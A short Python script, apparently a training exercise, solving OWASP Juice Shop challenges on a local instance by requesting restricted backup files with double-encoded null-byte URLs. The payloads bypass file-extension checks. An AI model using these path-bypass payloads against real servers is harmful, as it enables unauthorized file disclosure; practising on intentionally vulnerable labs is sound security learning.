import requests
import sys


# sending requests with proper headers
def send_get_request(url, cookie_value):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Cookie': cookie_value,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1'
    }

    response = requests.get(url, headers=headers)
    print(f'Response from {url}:')
    print(response.text)
    print('')

if __name__ == '__main__':
    base_url = 'http://localhost:3000' # defining base URL (URL of application)

    cookie_value = sys.argv[1]  # retrieving the value of the cookie from the script execution argument

    urls = [
        '/ftp/coupons_2013.md.bak%25%30%30.md', # Forgotten Sales Backup
        '/ftp/suspicious_errors.yml%25%30%30.md', # Misplaced Signature File
        '/ftp/package.json.bak%25%30%30.md', # Forgotten Developer Backup & Poison Null Byte
        '/ftp/eastere.gg%25%30%30.md', # Easter Egg
        '/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg' # Nested Easter Egg
    ]

# loop sending requests with full URL and current cookie value
    for url in urls:
        full_url = base_url + url
        send_get_request(full_url, cookie_value)